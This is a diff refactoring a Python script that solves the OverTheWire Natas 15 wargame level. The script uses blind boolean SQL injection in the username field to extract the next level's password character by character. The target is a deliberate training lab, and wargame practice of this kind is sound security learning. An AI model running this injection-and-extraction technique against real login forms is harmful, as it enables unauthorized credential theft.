@@ -9,8 +9,9 @@ import requests
 
 # The URL of the level as well as the username for it. There will be a known
 # password as well, but read it from the user so that it is not published.
-URL = 'http://natas15.natas.labs.overthewire.org/index.php'
-USERNAME = 'natas15'
+LEVEL_CURRENT = 'natas15'
+LEVEL_NEXT = 'natas16'
+URL = f'http://{LEVEL_CURRENT}.natas.labs.overthewire.org/index.php'
 
 # The strings used to determine if the partial password guess is incorrect or
 # correct.
@@ -23,13 +24,13 @@ SUCCESS_STRING = 'This user exists.'
 PASSWORD_LENGTH = 32
 PASSWORD_CHARACTERS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
 
-# Global counter for API calls
+# Global counter for HTTP requests
 http_request_count = 0
 
 def get_authentication_credentials() -> tuple[str, str]:
     """Prompt the user for the password and return the authentication tuple."""
-    password = getpass.getpass(prompt=f'Enter password for {USERNAME}: ')
-    return USERNAME, password
+    password = getpass.getpass(prompt=f'Enter password for {LEVEL_CURRENT}: ')
+    return LEVEL_CURRENT, password
 
 def send_post_request(data: dict[str, str], credentials: tuple[str, str]) -> str:
     """
@@ -40,7 +41,16 @@ def send_post_request(data: dict[str, str], credentials: tuple[str, str]) -> str
     http_request_count += 1
     response = requests.post(URL, auth=credentials, data=data)
     response.raise_for_status()
+
     return response.text
+
+def response_indicates_success(response_text: str) -> bool:
+    if FAILURE_STRING in response_text:
+        return False
+    elif SUCCESS_STRING in response_text:
+        return True
+    else:
+        raise RuntimeError(f"Unexpected response:\n{response_text}")
 
 def try_password_char(password_guess: str, credentials: tuple[str, str]) -> bool:
     """
@@ -48,17 +58,12 @@ def try_password_char(password_guess: str, credentials: tuple[str, str]) -> bool
     Raises RuntimeError if the response is unexpected.
     """
     payload = {
-        'username': f'natas16" AND BINARY SUBSTRING(password, 1, {len(password_guess)}) = "{password_guess}'
+        'username': f'{LEVEL_NEXT}" AND BINARY SUBSTRING(password, 1, {len(password_guess)}) = "{password_guess}'
     }
 
     response_text = send_post_request(payload, credentials)
 
-    if FAILURE_STRING in response_text:
-        return False
-    elif SUCCESS_STRING in response_text:
-        return True
-    else:
-        raise RuntimeError(f"Unexpected response for guess '{password_guess}':\n{response_text[:200]}")
+    return response_indicates_success(response_text)
 
 def confirm_password(password: str, credentials: tuple[str, str]) -> bool:
     """
@@ -67,17 +72,12 @@ def confirm_password(password: str, credentials: tuple[str, str]) -> bool:
     Raises RuntimeError if the response is unexpected.
     """
     payload = {
-        'username': f'natas16" AND BINARY password = "{password}'
+        'username': f'{LEVEL_NEXT}" AND BINARY password = "{password}'
     }
 
     response_text = send_post_request(payload, credentials)
 
-    if FAILURE_STRING in response_text:
-        return False
-    elif SUCCESS_STRING in response_text:
-        return True
-    else:
-        raise RuntimeError(f"Unexpected confirmation response:\n{response_text[:200]}")
+    return response_indicates_success(response_text)
 
 def main():
     credentials = get_authentication_credentials()
@@ -88,28 +88,28 @@ def main():
             guess = password + char
             try:
                 if try_password_char(guess, credentials):
-                    print(f"[+] Found character {len(password) + 1} of {PASSWORD_LENGTH}: {char}")
+                    print(f"Found character {len(password) + 1} of {PASSWORD_LENGTH}: {char}")
                     password += char
                     break
             except requests.RequestException as e:
-                print(f"[!] Network error on '{guess}': {e}")
+                print(f"Network error: {e}")
                 return
             except RuntimeError as e:
-                print(f"[!] {e}")
+                print(f"Runtime error: {e}")
                 return
 
-    print(f"[+] Candidate password: {password}")
-    print("[*] Verifying full password...")
+    print(f"Candidate password: {password}")
+    print("Verifying full password...")
 
     try:
         if confirm_password(password, credentials):
-            print(f"[✔] Password confirmed: {password}")
+            print(f"Password confirmed: {password}")
         else:
-            print(f"[✘] Final confirmation failed. Password may be incorrect.")
+            print(f"Final confirmation failed. Password may be incorrect.")
     except RuntimeError as e:
-        print(f"[!] {e}")
+        print(f"Runtime error: {e}")
 
-    print(f"[*] Total API calls: {http_request_count}")
+    print(f"Total HTTP requests: {http_request_count}")
 
 if __name__ == '__main__':
     main()
